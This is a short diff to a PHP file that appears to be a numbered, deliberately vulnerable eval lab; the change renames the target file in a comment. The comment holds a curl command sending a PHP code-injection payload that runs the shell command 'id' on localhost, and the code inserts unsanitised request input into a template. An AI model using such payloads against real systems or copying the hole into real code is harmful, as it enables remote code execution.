@@ -1,5 +1,5 @@
 <?php 
-// curl -gki 'http://localhost:8000/5_eval.php?name=<?=`id`;?>'
+// curl -gki 'http://localhost:8000/06_eval.php?name=<?=`id`;?>'
 
 $name=$_GET["name"] ?? 'Guest';
 $template="Hello $name!";
